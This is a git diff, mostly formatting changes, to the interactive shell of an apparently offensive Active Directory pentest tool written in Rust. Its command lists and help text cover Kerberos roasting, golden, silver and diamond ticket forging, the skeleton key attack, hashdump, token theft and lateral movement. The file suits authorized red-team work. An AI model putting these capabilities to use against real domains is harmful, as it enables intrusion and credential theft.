@@ -4,8 +4,8 @@
 //! with command parsing, tab completion, history, and module integration.
 //! Inspired by evil-winrm and other penetration testing shells.
 
-use crate::banner;
 use crate::ShellType as CliShellType;
+use crate::banner;
 use colored::Colorize;
 use overthrone_core::error::Result;
 use overthrone_core::exec::ExecCredentials;
@@ -54,29 +54,128 @@ fn to_core_shell_type(shell_type: &CliShellType) -> ShellType {
 
 /// Available commands for tab completion
 const COMMANDS: &[&str] = &[
-    "help", "?", "connect", "disconnect", "exec", "enum", "kerberos", "smb",
-    "graph", "reaper", "exit", "quit", "q", "clear", "cls", "history", "h",
-    "whoami", "hostname", "pwd", "ls", "dir", "cd", "upload", "download",
-    "info", "sessions", "bg", "fg", "set", "unset", "run", "use", "log",
-    "spawn", "pivot", "migrate", "steal_token", "rev2self", "getuid",
-    "getpid", "ps", "kill", "shell", "powershell", "cat", "type", "rm",
-    "del", "mkdir", "rmdir", "mv", "cp", "copy", "timestomp", "hashdump",
-    "luid", "klist", "kirbi", "ptt", "purge", "monitor", "net", "ipconfig",
+    "help",
+    "?",
+    "connect",
+    "disconnect",
+    "exec",
+    "enum",
+    "kerberos",
+    "smb",
+    "graph",
+    "reaper",
+    "exit",
+    "quit",
+    "q",
+    "clear",
+    "cls",
+    "history",
+    "h",
+    "whoami",
+    "hostname",
+    "pwd",
+    "ls",
+    "dir",
+    "cd",
+    "upload",
+    "download",
+    "info",
+    "sessions",
+    "bg",
+    "fg",
+    "set",
+    "unset",
+    "run",
+    "use",
+    "log",
+    "spawn",
+    "pivot",
+    "migrate",
+    "steal_token",
+    "rev2self",
+    "getuid",
+    "getpid",
+    "ps",
+    "kill",
+    "shell",
+    "powershell",
+    "cat",
+    "type",
+    "rm",
+    "del",
+    "mkdir",
+    "rmdir",
+    "mv",
+    "cp",
+    "copy",
+    "timestomp",
+    "hashdump",
+    "luid",
+    "klist",
+    "kirbi",
+    "ptt",
+    "purge",
+    "monitor",
+    "net",
+    "ipconfig",
 ];
 
 /// Subcommands for specific commands
 const KERBEROS_SUBCOMMANDS: &[&str] = &["roast", "asrep", "tgt", "tgs", "list", "purge", "ptt"];
 const SMB_SUBCOMMANDS: &[&str] = &["shares", "admin", "spider", "get", "put", "ls", "cat"];
 const GRAPH_SUBCOMMANDS: &[&str] = &["build", "path", "path_to_da", "stats", "export", "shortest"];
-const ENUM_SUBCOMMANDS: &[&str] = &["users", "computers", "groups", "trusts", "spns", "asrep", "delegations", "gpos", "all"];
-const REAPER_SUBCOMMANDS: &[&str] = &["all", "users", "computers", "groups", "trusts", "spns", "delegations", "gpos", "laps", "mssql", "adcs"];
-const USE_MODULES: &[&str] = &["hunter/kerberoast", "hunter/asreproast", "hunter/coerce", "hunter/rbcd",
-    "forge/golden", "forge/silver", "forge/diamond", "forge/skeleton",
-    "reaper/users", "reaper/computers", "reaper/groups", "reaper/trusts",
-    "reaper/adcs", "reaper/laps", "reaper/mssql", "crawler/bloodhound"];
+const ENUM_SUBCOMMANDS: &[&str] = &[
+    "users",
+    "computers",
+    "groups",
+    "trusts",
+    "spns",
+    "asrep",
+    "delegations",
+    "gpos",
+    "all",
+];
+const REAPER_SUBCOMMANDS: &[&str] = &[
+    "all",
+    "users",
+    "computers",
+    "groups",
+    "trusts",
+    "spns",
+    "delegations",
+    "gpos",
+    "laps",
+    "mssql",
+    "adcs",
+];
+const USE_MODULES: &[&str] = &[
+    "hunter/kerberoast",
+    "hunter/asreproast",
+    "hunter/coerce",
+    "hunter/rbcd",
+    "forge/golden",
+    "forge/silver",
+    "forge/diamond",
+    "forge/skeleton",
+    "reaper/users",
+    "reaper/computers",
+    "reaper/groups",
+    "reaper/trusts",
+    "reaper/adcs",
+    "reaper/laps",
+    "reaper/mssql",
+    "crawler/bloodhound",
+];
 
 /// Session variables that can be set
-const SETTABLE_VARS: &[&str] = &["timeout", "debug", "color", "prompt", "auto_upload", "download_path"];
+const SETTABLE_VARS: &[&str] = &[
+    "timeout",
+    "debug",
+    "color",
+    "prompt",
+    "auto_upload",
+    "download_path",
+];
 
 /// Custom completer for Overthrone commands
 #[derive(Helper)]
@@ -97,7 +196,7 @@ impl OverthroneCompleter {
     fn complete_command(&self, line: &str, pos: usize) -> rustyline::Result<(usize, Vec<Pair>)> {
         let args: Vec<&str> = line.split_whitespace().collect();
         let mut completions = Vec::new();
-        
+
         if args.is_empty() || (line.ends_with(' ') && args.len() == 1) {
             // Complete command names
             for cmd in COMMANDS {
@@ -125,7 +224,7 @@ impl OverthroneCompleter {
                 "use" => USE_MODULES,
                 _ => &[],
             };
-            
+
             for subcmd in subcommands {
                 if subcmd.starts_with(prefix) {
                     completions.push(Pair {
@@ -134,9 +233,13 @@ impl OverthroneCompleter {
                     });
                 }
             }
-            
+
             if !completions.is_empty() {
-                let start = if args.len() == 2 { line.len() - prefix.len() } else { pos };
+                let start = if args.len() == 2 {
+                    line.len() - prefix.len()
+                } else {
+                    pos
+                };
                 return Ok((start, completions));
             }
         }
@@ -154,7 +257,12 @@ impl OverthroneCompleter {
 impl Completer for OverthroneCompleter {
     type Candidate = Pair;
 
-    fn complete(&self, line: &str, pos: usize, _ctx: &Context<'_>) -> rustyline::Result<(usize, Vec<Pair>)> {
+    fn complete(
+        &self,
+        line: &str,
+        pos: usize,
+        _ctx: &Context<'_>,
+    ) -> rustyline::Result<(usize, Vec<Pair>)> {
         // First try command completion
         let (cmd_start, cmd_completions) = self.complete_command(line, pos)?;
         if !cmd_completions.is_empty() {
@@ -165,10 +273,27 @@ impl Completer for OverthroneCompleter {
         let args: Vec<&str> = line.split_whitespace().collect();
         if !args.is_empty() {
             let command = args[0].to_lowercase();
-            if matches!(command.as_str(), "upload" | "download" | "cd" | "cat" | "type" | "run" | "rm" | "del" | "mkdir" | "ls" | "dir") {
+            if matches!(
+                command.as_str(),
+                "upload"
+                    | "download"
+                    | "cd"
+                    | "cat"
+                    | "type"
+                    | "run"
+                    | "rm"
+                    | "del"
+                    | "mkdir"
+                    | "ls"
+                    | "dir"
+            ) {
                 // Get the partial path being typed
                 if args.len() > 1 || line.ends_with(' ') {
-                    let partial = if args.len() > 1 { args.last().unwrap_or(&"") } else { "" };
+                    let partial = if args.len() > 1 {
+                        args.last().unwrap_or(&"")
+                    } else {
+                        ""
+                    };
                     return self.file_completer.complete(partial, partial.len(), _ctx);
                 }
             }
@@ -183,8 +308,15 @@ impl Highlighter for OverthroneCompleter {
         // Highlight the command in the prompt color
         let parts: Vec<&str> = line.splitn(2, ' ').collect();
         if !parts.is_empty() {
-            Cow::Owned(format!("{}{}", parts[0].color(PROMPT_COLOR), 
-                if parts.len() > 1 { format!(" {}", parts[1]) } else { String::new() }))
+            Cow::Owned(format!(
+                "{}{}",
+                parts[0].color(PROMPT_COLOR),
+                if parts.len() > 1 {
+                    format!(" {}", parts[1])
+                } else {
+                    String::new()
+                }
+            ))
         } else {
             Cow::Borrowed(line)
         }
@@ -209,7 +341,7 @@ impl Highlighter for OverthroneCompleter {
 
 impl Hinter for OverthroneCompleter {
     type Hint = String;
-    
+
     fn hint(&self, _line: &str, _pos: usize, _ctx: &rustyline::Context<'_>) -> Option<String> {
         None
     }
@@ -243,11 +375,13 @@ impl std::fmt::Display for SessionInfo {
     fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
         let user = self.username.as_deref().unwrap_or("unknown");
         let since = self.created.format("%H:%M:%S");
-        write!(f, "Session {} - {}\\{}@{} ({}) [{}]", 
-            self.id, 
-            self.domain.as_deref().unwrap_or("DOMAIN"), 
-            user, 
-            self.target, 
+        write!(
+            f,
+            "Session {} - {}\\{}@{} ({}) [{}]",
+            self.id,
+            self.domain.as_deref().unwrap_or("DOMAIN"),
+            user,
+            self.target,
             self.shell_type,
             since
         )
@@ -360,25 +494,35 @@ impl InteractiveSession {
 
     /// Set credentials for the session
     #[allow(dead_code)] // Used when starting shell with pre-configured creds
-    pub fn with_credentials(mut self, domain: String, username: String, password: Option<String>) -> Self {
+    pub fn with_credentials(
+        mut self,
+        domain: String,
+        username: String,
+        password: Option<String>,
+    ) -> Self {
         self.credentials = Some((domain, username, password));
         self
     }
 
     /// Build `ExecCredentials` from the stored `(domain, username, password)` tuple.
     fn build_exec_credentials(&self) -> Option<ExecCredentials> {
-        self.credentials.as_ref().map(|(domain, username, password)| ExecCredentials {
-            domain: domain.clone(),
-            username: username.clone(),
-            password: password.clone().unwrap_or_default(),
-            nt_hash: None,
-        })
+        self.credentials
+            .as_ref()
+            .map(|(domain, username, password)| ExecCredentials {
+                domain: domain.clone(),
+                username: username.clone(),
+                password: password.clone().unwrap_or_default(),
+                nt_hash: None,
+            })
     }
 
     /// Start the interactive shell
     pub async fn start(&mut self) -> Result<()> {
         banner::print_banner();
-        println!("{}", "Interactive Mode - Type 'help' for available commands".bright_yellow());
+        println!(
+            "{}",
+            "Interactive Mode - Type 'help' for available commands".bright_yellow()
+        );
         println!();
 
         // Setup rustyline editor
@@ -390,24 +534,29 @@ impl InteractiveSession {
             .expect("Invalid max history size")
             .build();
 
-        let mut rl: Editor<OverthroneCompleter, DefaultHistory> = Editor::with_config(config)
-            .expect("Failed to create editor");
+        let mut rl: Editor<OverthroneCompleter, DefaultHistory> =
+            Editor::with_config(config).expect("Failed to create editor");
 
         // Setup helper with completion
         let helper = OverthroneCompleter::new(self.sessions.clone());
         rl.set_helper(Some(helper));
-        
+
         // Load history from file if exists
         let history_path = dirs::config_dir()
             .map(|p| p.join("overthrone").join("history.txt"))
             .unwrap_or_else(|| std::path::PathBuf::from(".overthrone_history"));
-        
+
         let _ = rl.load_history(&history_path);
 
         // Auto-connect if target was provided
         if let (Some(target), Some(shell_type)) = (&self.initial_target, &self.initial_shell_type) {
-            println!("{} Auto-connecting to {} via {}...", "▸".bright_black(), target.cyan(), shell_type);
-            
+            println!(
+                "{} Auto-connecting to {} via {}...",
+                "▸".bright_black(),
+                target.cyan(),
+                shell_type
+            );
+
             let config = ShellConfig {
                 target: target.clone(),
                 shell_type: *shell_type,
@@ -424,7 +573,7 @@ impl InteractiveSession {
                         *next_id += 1;
                         id
                     };
-                    
+
                     let session_info = SessionInfo {
                         id: session_id,
                         target: target.clone(),
@@ -435,19 +584,26 @@ impl InteractiveSession {
                         last_command: None,
                         command_count: 0,
                     };
-                    
+
                     let mut sessions = self.sessions.lock().await;
                     sessions.push(session_info);
-                    
+
                     self.shell = Some(shell);
                     self.session_id = Some(session_id);
-                    
-                    println!("{} Connected successfully! Session {}", "✓".green(), session_id);
+
+                    println!(
+                        "{} Connected successfully! Session {}",
+                        "✓".green(),
+                        session_id
+                    );
                     println!();
                 }
                 Err(e) => {
                     println!("{} Auto-connect failed: {}", "✗".red(), e);
-                    println!("{} Use 'connect <target> [type]' to connect manually", "▸".bright_black());
+                    println!(
+                        "{} Use 'connect <target> [type]' to connect manually",
+                        "▸".bright_black()
+                    );
                     println!();
                 }
             }
@@ -456,11 +612,11 @@ impl InteractiveSession {
         // Main command loop
         loop {
             let prompt = self.get_prompt();
-            
+
             match rl.readline(&prompt) {
                 Ok(line) => {
                     let input = line.trim();
-                    
+
                     if input.is_empty() {
                         continue;
                     }
@@ -523,7 +679,12 @@ impl InteractiveSession {
             format!(
                 "{}@{}({})[{}]> ",
                 self.vars.prompt.cyan(),
-                session_info.target.split('.').next().unwrap_or("target").cyan(),
+                session_info
+                    .target
+                    .split('.')
+                    .next()
+                    .unwrap_or("target")
+                    .cyan(),
                 format!("{}", session_info.shell_type).yellow(),
                 session_info.command_count.to_string().dimmed()
             )
@@ -549,7 +710,7 @@ impl InteractiveSession {
     async fn execute_command(&mut self, input: &str) -> Result<bool> {
         let words = shell_words(input);
         let args: Vec<&str> = words.iter().map(|s| s.as_str()).collect();
-        
+
         if args.is_empty() {
             return Ok(false);
         }
@@ -566,21 +727,21 @@ impl InteractiveSession {
             // Help and info
             "help" | "?" => self.show_help(args),
             "info" => self.cmd_info().await?,
-            
+
             // Connection management
             "connect" => self.cmd_connect(args).await?,
             "disconnect" => self.cmd_disconnect().await?,
-            
+
             // Session management
             "sessions" => self.cmd_sessions().await?,
             "bg" => self.cmd_bg().await?,
             "fg" => self.cmd_fg(args).await?,
-            
+
             // Command execution
             "exec" | "shell" => self.cmd_exec(args).await?,
             "powershell" => self.cmd_powershell(args).await?,
             "run" => self.cmd_run(args).await?,
-            
+
             // File operations
             "upload" => self.cmd_upload(args).await?,
             "download" => self.cmd_download(args).await?,
@@ -590,77 +751,82 @@ impl InteractiveSession {
             "rmdir" => self.cmd_rmdir(args).await?,
             "mv" => self.cmd_mv(args).await?,
             "cp" | "copy" => self.cmd_cp(args).await?,
-            
+
             // Enumeration
             "enum" => self.cmd_enum(args).await?,
             "reaper" => self.cmd_reaper(args).await?,
-            
+
             // Kerberos operations
             "kerberos" => self.cmd_kerberos(args).await?,
             "klist" => self.cmd_klist().await?,
             "ptt" => self.cmd_ptt(args).await?,
             "purge" => self.cmd_purge().await?,
-            
+
             // SMB operations
             "smb" => self.cmd_smb(args).await?,
-            
+
             // Graph operations
             "graph" => self.cmd_graph(args).await?,
-            
+
             // Lateral movement
             "pivot" => self.cmd_pivot(args).await?,
             "spawn" => self.cmd_spawn(args).await?,
             "migrate" => self.cmd_migrate(args).await?,
-            
+
             // Token manipulation
             "steal_token" => self.cmd_steal_token(args).await?,
             "rev2self" => self.cmd_rev2self().await?,
             "getuid" => self.cmd_getuid().await?,
             "getpid" => self.cmd_getpid().await?,
-            
+
             // Process management
             "ps" => self.cmd_ps(args).await?,
             "kill" => self.cmd_kill(args).await?,
-            
+
             // Variable management
             "set" => self.cmd_set(args),
             "unset" => self.cmd_unset(args),
-            
+
             // Module system
             "use" => self.cmd_use(args).await?,
-            "back" => { self.module = None; },
+            "back" => {
+                self.module = None;
+            }
             "options" => self.show_options(),
-            
+
             // Logging
             "log" => self.cmd_log(args).await?,
-            
+
             // Network commands
             "net" => self.cmd_net(args).await?,
             "ipconfig" => self.cmd_ipconfig().await?,
-            
+
             // Hash operations
             "hashdump" => self.cmd_hashdump(args).await?,
-            
+
             // Basic shell commands (pass to remote if connected)
             "whoami" => self.cmd_whoami().await?,
             "hostname" => self.cmd_hostname().await?,
             "pwd" => self.cmd_pwd().await?,
             "ls" | "dir" => self.cmd_ls(args).await?,
             "cd" => self.cmd_cd(args).await?,
-            
+
             // Shell management
             "exit" | "quit" | "q" => return Ok(true),
             "clear" | "cls" => self.cmd_clear(),
             "history" | "h" => self.cmd_history(),
-            
+
             // Unknown command - pass to remote shell if connected
             _ => {
                 if let Some(shell) = &mut self.shell {
                     let output = shell.execute(input).await?;
                     println!("{}", output);
                 } else {
-                    println!("{} Unknown command '{}'. Type 'help' for available commands.", 
-                        "Error:".red(), command);
+                    println!(
+                        "{} Unknown command '{}'. Type 'help' for available commands.",
+                        "Error:".red(),
+                        command
+                    );
                 }
             }
         }
@@ -694,7 +860,10 @@ impl InteractiveSession {
             }
             _ => {
                 println!("{} Unknown module command: {}", "Error:".red(), command);
-                println!("{} Available: set, unset, options, run, back", "▸".bright_black());
+                println!(
+                    "{} Available: set, unset, options, run, back",
+                    "▸".bright_black()
+                );
             }
         }
         Ok(false)
@@ -710,63 +879,227 @@ impl InteractiveSession {
             return;
         }
 
-        println!("\n{} {}", "╭─".bright_black(), "Overthrone Interactive Shell".bright_yellow());
+        println!(
+            "\n{} {}",
+            "╭─".bright_black(),
+            "Overthrone Interactive Shell".bright_yellow()
+        );
         println!("{}", "│".bright_black());
-        
-        println!("{} {} Management:", "│".bright_black(), "Session".bright_yellow());
-        println!("{}   {:<25} Connect to a target (winrm/smb/wmi)", "│".bright_black(), "connect <target> [type]".cyan());
-        println!("{}   {:<25} Disconnect from current session", "│".bright_black(), "disconnect".cyan());
-        println!("{}   {:<25} List all active sessions", "│".bright_black(), "sessions".cyan());
-        println!("{}   {:<25} Background current session", "│".bright_black(), "bg".cyan());
-        println!("{}   {:<25} Foreground a session", "│".bright_black(), "fg [id]".cyan());
-        println!("{}   {:<25} Show session information", "│".bright_black(), "info".cyan());
-        
+
+        println!(
+            "{} {} Management:",
+            "│".bright_black(),
+            "Session".bright_yellow()
+        );
+        println!(
+            "{}   {:<25} Connect to a target (winrm/smb/wmi)",
+            "│".bright_black(),
+            "connect <target> [type]".cyan()
+        );
+        println!(
+            "{}   {:<25} Disconnect from current session",
+            "│".bright_black(),
+            "disconnect".cyan()
+        );
+        println!(
+            "{}   {:<25} List all active sessions",
+            "│".bright_black(),
+            "sessions".cyan()
+        );
+        println!(
+            "{}   {:<25} Background current session",
+            "│".bright_black(),
+            "bg".cyan()
+        );
+        println!(
+            "{}   {:<25} Foreground a session",
+            "│".bright_black(),
+            "fg [id]".cyan()
+        );
+        println!(
+            "{}   {:<25} Show session information",
+            "│".bright_black(),
+            "info".cyan()
+        );
+
         println!("{}", "│".bright_black());
-        println!("{} {} Execution:", "│".bright_black(), "Command".bright_yellow());
-        println!("{}   {:<25} Execute command on target", "│".bright_black(), "exec <command>".cyan());
-        println!("{}   {:<25} Execute PowerShell command", "│".bright_black(), "powershell <cmd>".cyan());
-        println!("{}   {:<25} Run local script on target", "│".bright_black(), "run <script>".cyan());
-        
+        println!(
+            "{} {} Execution:",
+            "│".bright_black(),
+            "Command".bright_yellow()
+        );
+        println!(
+            "{}   {:<25} Execute command on target",
+            "│".bright_black(),
+            "exec <command>".cyan()
+        );
+        println!(
+            "{}   {:<25} Execute PowerShell command",
+            "│".bright_black(),
+            "powershell <cmd>".cyan()
+        );
+        println!(
+            "{}   {:<25} Run local script on target",
+            "│".bright_black(),
+            "run <script>".cyan()
+        );
+
         println!("{}", "│".bright_black());
-        println!("{} {} Operations:", "│".bright_black(), "File".bright_yellow());
-        println!("{}   {:<25} Upload file to target", "│".bright_black(), "upload <local> <remote>".cyan());
-        println!("{}   {:<25} Download file from target", "│".bright_black(), "download <remote> <local>".cyan());
-        println!("{}   {:<25} Display file contents", "│".bright_black(), "cat/type <file>".cyan());
-        println!("{}   {:<25} List directory", "│".bright_black(), "ls/dir [path]".cyan());
-        println!("{}   {:<25} Change directory", "│".bright_black(), "cd <path>".cyan());
-        println!("{}   {:<25} Delete file", "│".bright_black(), "rm/del <file>".cyan());
-        println!("{}   {:<25} Create directory", "│".bright_black(), "mkdir <dir>".cyan());
-        
+        println!(
+            "{} {} Operations:",
+            "│".bright_black(),
+            "File".bright_yellow()
+        );
+        println!(
+            "{}   {:<25} Upload file to target",
+            "│".bright_black(),
+            "upload <local> <remote>".cyan()
+        );
+        println!(
+            "{}   {:<25} Download file from target",
+            "│".bright_black(),
+            "download <remote> <local>".cyan()
+        );
+        println!(
+            "{}   {:<25} Display file contents",
+            "│".bright_black(),
+            "cat/type <file>".cyan()
+        );
+        println!(
+            "{}   {:<25} List directory",
+            "│".bright_black(),
+            "ls/dir [path]".cyan()
+        );
+        println!(
+            "{}   {:<25} Change directory",
+            "│".bright_black(),
+            "cd <path>".cyan()
+        );
+        println!(
+            "{}   {:<25} Delete file",
+            "│".bright_black(),
+            "rm/del <file>".cyan()
+        );
+        println!(
+            "{}   {:<25} Create directory",
+            "│".bright_black(),
+            "mkdir <dir>".cyan()
+        );
+
         println!("{}", "│".bright_black());
-        println!("{} {} Enumeration:", "│".bright_black(), "AD".bright_yellow());
-        println!("{}   {:<25} Enumerate AD objects", "│".bright_black(), "enum <target>".cyan());
-        println!("{}   {:<25} Full AD enumeration", "│".bright_black(), "reaper [modules]".cyan());
-        println!("{}   {:<25} Kerberos operations", "│".bright_black(), "kerberos <action>".cyan());
-        println!("{}   {:<25} SMB operations", "│".bright_black(), "smb <action>".cyan());
-        println!("{}   {:<25} Attack graph operations", "│".bright_black(), "graph <action>".cyan());
-        
+        println!(
+            "{} {} Enumeration:",
+            "│".bright_black(),
+            "AD".bright_yellow()
+        );
+        println!(
+            "{}   {:<25} Enumerate AD objects",
+            "│".bright_black(),
+            "enum <target>".cyan()
+        );
+        println!(
+            "{}   {:<25} Full AD enumeration",
+            "│".bright_black(),
+            "reaper [modules]".cyan()
+        );
+        println!(
+            "{}   {:<25} Kerberos operations",
+            "│".bright_black(),
+            "kerberos <action>".cyan()
+        );
+        println!(
+            "{}   {:<25} SMB operations",
+            "│".bright_black(),
+            "smb <action>".cyan()
+        );
+        println!(
+            "{}   {:<25} Attack graph operations",
+            "│".bright_black(),
+            "graph <action>".cyan()
+        );
+
         println!("{}", "│".bright_black());
-        println!("{} {} Movement:", "│".bright_black(), "Lateral".bright_yellow());
-        println!("{}   {:<25} Pivot to new target", "│".bright_black(), "pivot <target>".cyan());
-        println!("{}   {:<25} Spawn new session", "│".bright_black(), "spawn <type>".cyan());
-        println!("{}   {:<25} Steal token from process", "│".bright_black(), "steal_token <pid>".cyan());
-        println!("{}   {:<25} Revert to original token", "│".bright_black(), "rev2self".cyan());
-        
+        println!(
+            "{} {} Movement:",
+            "│".bright_black(),
+            "Lateral".bright_yellow()
+        );
+        println!(
+            "{}   {:<25} Pivot to new target",
+            "│".bright_black(),
+            "pivot <target>".cyan()
+        );
+        println!(
+            "{}   {:<25} Spawn new session",
+            "│".bright_black(),
+            "spawn <type>".cyan()
+        );
+        println!(
+            "{}   {:<25} Steal token from process",
+            "│".bright_black(),
+            "steal_token <pid>".cyan()
+        );
+        println!(
+            "{}   {:<25} Revert to original token",
+            "│".bright_black(),
+            "rev2self".cyan()
+        );
+
         println!("{}", "│".bright_black());
-        println!("{} {} System:", "│".bright_black(), "Module".bright_yellow());
-        println!("{}   {:<25} Load a module", "│".bright_black(), "use <module>".cyan());
-        println!("{}   {:<25} Exit module context", "│".bright_black(), "back".cyan());
-        println!("{}   {:<25} Show module options", "│".bright_black(), "options".cyan());
-        println!("{}   {:<25} Set module option", "│".bright_black(), "set <option> <value>".cyan());
-        
+        println!(
+            "{} {} System:",
+            "│".bright_black(),
+            "Module".bright_yellow()
+        );
+        println!(
+            "{}   {:<25} Load a module",
+            "│".bright_black(),
+            "use <module>".cyan()
+        );
+        println!(
+            "{}   {:<25} Exit module context",
+            "│".bright_black(),
+            "back".cyan()
+        );
+        println!(
+            "{}   {:<25} Show module options",
+            "│".bright_black(),
+            "options".cyan()
+        );
+        println!(
+            "{}   {:<25} Set module option",
+            "│".bright_black(),
+            "set <option> <value>".cyan()
+        );
+
         println!("{}", "│".bright_black());
         println!("{} {} Shell:", "│".bright_black(), "Local".bright_yellow());
-        println!("{}   {:<25} Set session variable", "│".bright_black(), "set <var> <value>".cyan());
-        println!("{}   {:<25} Log commands to file", "│".bright_black(), "log <file>".cyan());
-        println!("{}   {:<25} Clear screen", "│".bright_black(), "clear/cls".cyan());
-        println!("{}   {:<25} Show command history", "│".bright_black(), "history/h".cyan());
-        println!("{}   {:<25} Exit interactive shell", "│".bright_black(), "exit/quit/q".cyan());
-        
+        println!(
+            "{}   {:<25} Set session variable",
+            "│".bright_black(),
+            "set <var> <value>".cyan()
+        );
+        println!(
+            "{}   {:<25} Log commands to file",
+            "│".bright_black(),
+            "log <file>".cyan()
+        );
+        println!(
+            "{}   {:<25} Clear screen",
+            "│".bright_black(),
+            "clear/cls".cyan()
+        );
+        println!(
+            "{}   {:<25} Show command history",
+            "│".bright_black(),
+            "history/h".cyan()
+        );
+        println!(
+            "{}   {:<25} Exit interactive shell",
+            "│".bright_black(),
+            "exit/quit/q".cyan()
+        );
+
         println!("{}\n", "╰─".bright_black());
     }
 
@@ -787,14 +1120,23 @@ impl InteractiveSession {
                 println!("  {:<20} Enumerate SMB shares", "shares".cyan());
                 println!("  {:<20} Check admin access", "admin".cyan());
                 println!("  {:<20} Spider shares for files", "spider".cyan());
-                println!("  {:<20} Download file via SMB", "get <remote> <local>".cyan());
-                println!("  {:<20} Upload file via SMB", "put <local> <remote>".cyan());
+                println!(
+                    "  {:<20} Download file via SMB",
+                    "get <remote> <local>".cyan()
+                );
+                println!(
+                    "  {:<20} Upload file via SMB",
+                    "put <local> <remote>".cyan()
+                );
             }
             "graph" => {
                 println!("\n{} Graph Operations:", "▸".bright_yellow());
                 println!("  {:<20} Build attack graph from AD data", "build".cyan());
                 println!("  {:<20} Find attack path", "path <from> <to>".cyan());
-                println!("  {:<20} Find path to Domain Admins", "path_to_da <from>".cyan());
+                println!(
+                    "  {:<20} Find path to Domain Admins",
+                    "path_to_da <from>".cyan()
+                );
                 println!("  {:<20} Show graph statistics", "stats".cyan());
                 println!("  {:<20} Export graph to file", "export [file]".cyan());
             }
@@ -805,24 +1147,28 @@ impl InteractiveSession {
                 println!("    hunter/asreproast   - AS-REP Roasting attack");
                 println!("    hunter/coerce       - Authentication coercion");
                 println!("    hunter/rbcd         - RBCD abuse");
-                
+
                 println!("\n  {} Forge:", "▸".bright_black());
                 println!("    forge/golden        - Forge Golden Ticket");
                 println!("    forge/silver        - Forge Silver Ticket");
                 println!("    forge/diamond       - Forge Diamond Ticket");
                 println!("    forge/skeleton      - Skeleton key attack");
-                
+
                 println!("\n  {} Reaper:", "▸".bright_black());
                 println!("    reaper/users        - Enumerate users");
                 println!("    reaper/computers    - Enumerate computers");
                 println!("    reaper/groups       - Enumerate groups");
                 println!("    reaper/trusts       - Enumerate trusts");
-                
+
                 println!("\n  {} Crawler:", "▸".bright_black());
                 println!("    crawler/bloodhound  - BloodHound data collection");
             }
             _ => {
-                println!("{} No detailed help available for '{}'", "Error:".red(), cmd);
+                println!(
+                    "{} No detailed help available for '{}'",
+                    "Error:".red(),
+                    cmd
+                );
             }
         }
         println!();
@@ -834,28 +1180,36 @@ impl InteractiveSession {
 
     async fn cmd_info(&self) -> Result<()> {
         println!("\n{} Session Information:", "▸".bright_yellow());
-        
+
         if let Some(shell) = &self.shell {
             let info = shell.session_info();
-            println!("  {:<15} {}", "Session ID:".cyan(), self.session_id.unwrap_or(0));
+            println!(
+                "  {:<15} {}",
+                "Session ID:".cyan(),
+                self.session_id.unwrap_or(0)
+            );
             println!("  {:<15} {}", "Target:".cyan(), info.target);
             println!("  {:<15} {}", "Shell Type:".cyan(), info.shell_type);
             println!("  {:<15} {}", "Commands Run:".cyan(), info.command_count);
         } else {
             println!("  {} No active session", "Status:".cyan());
         }
-        
+
         println!("\n{} Variables:", "▸".bright_yellow());
         println!("  {:<15} {}s", "Timeout:".cyan(), self.vars.timeout_secs);
         println!("  {:<15} {}", "Debug:".cyan(), self.vars.debug);
         println!("  {:<15} {}", "Color:".cyan(), self.vars.color);
         println!("  {:<15} {}", "Prompt:".cyan(), self.vars.prompt);
-        println!("  {:<15} {}", "Download Path:".cyan(), self.vars.download_path);
-        
+        println!(
+            "  {:<15} {}",
+            "Download Path:".cyan(),
+            self.vars.download_path
+        );
+
         if let Some(log) = &self.log_file {
             println!("  {:<15} {}", "Logging to:".cyan(), log);
         }
-        
+
         println!();
         Ok(())
     }
@@ -874,7 +1228,11 @@ impl InteractiveSession {
                 "smb" => ShellType::Smb,
                 "wmi" => ShellType::Wmi,
                 _ => {
-                    println!("{} Unknown shell type '{}'. Using WinRM.", "Warning:".yellow(), args[1]);
+                    println!(
+                        "{} Unknown shell type '{}'. Using WinRM.",
+                        "Warning:".yellow(),
+                        args[1]
+                    );
                     ShellType::Winrm
                 }
             }
@@ -882,7 +1240,12 @@ impl InteractiveSession {
             ShellType::Winrm
         };
 
-        println!("{} Connecting to {} via {}...", "▸".bright_black(), target.cyan(), shell_type.to_string().yellow());
+        println!(
+            "{} Connecting to {} via {}...",
+            "▸".bright_black(),
+            target.cyan(),
+            shell_type.to_string().yellow()
+        );
 
         let config = ShellConfig {
             target: target.to_string(),
@@ -900,7 +1263,7 @@ impl InteractiveSession {
                     *next_id += 1;
                     id
                 };
-                
+
                 let session_info = SessionInfo {
                     id: session_id,
                     target: target.to_string(),
@@ -911,14 +1274,18 @@ impl InteractiveSession {
                     last_command: None,
                     command_count: 0,
                 };
-                
+
                 let mut sessions = self.sessions.lock().await;
                 sessions.push(session_info);
-                
+
                 self.shell = Some(shell);
                 self.session_id = Some(session_id);
-                
-                println!("{} Connected successfully! Session {}", "✓".green(), session_id);
+
+                println!(
+                    "{} Connected successfully! Session {}",
+                    "✓".green(),
+                    session_id
+                );
             }
             Err(e) => {
                 println!("{} Connection failed: {}", "✗".red(), e);
@@ -931,13 +1298,13 @@ impl InteractiveSession {
     async fn cmd_disconnect(&mut self) -> Result<()> {
         if let Some(shell) = self.shell.take() {
             shell.close().await?;
-            
+
             // Remove from sessions list
             if let Some(id) = self.session_id {
                 let mut sessions = self.sessions.lock().await;
                 sessions.retain(|s| s.id != id);
             }
-            
+
             self.session_id = None;
             println!("{} Disconnected from session", "✓".green());
         } else {
@@ -948,25 +1315,29 @@ impl InteractiveSession {
 
     async fn cmd_sessions(&self) -> Result<()> {
         let sessions = self.sessions.lock().await;
-        
+
         if sessions.is_empty() {
             println!("{} No active sessions", "▸".bright_black());
             return Ok(());
         }
 
         println!("\n{} Active Sessions:", "▸".bright_yellow());
-        println!("  {:<4} {:<25} {:<10} {:<15} {:<8}", "ID", "Target", "Type", "User", "Cmds");
+        println!(
+            "  {:<4} {:<25} {:<10} {:<15} {:<8}",
+            "ID", "Target", "Type", "User", "Cmds"
+        );
         println!("  {}", "─".repeat(70).dimmed());
-        
+
         for session in sessions.iter() {
             let current = if Some(session.id) == self.session_id {
                 "*".green().to_string()
             } else {
                 " ".to_string()
             };
-            
+
             let user = session.username.as_deref().unwrap_or("unknown");
-            println!("{} {:<3} {:<25} {:<10} {:<15} {:<8}", 
+            println!(
+                "{} {:<3} {:<25} {:<10} {:<15} {:<8}",
                 current,
                 session.id.to_string().cyan(),
                 session.target.cyan(),
@@ -975,7 +1346,7 @@ impl InteractiveSession {
                 session.command_count
             );
         }
-        
+
         println!();
         Ok(())
     }
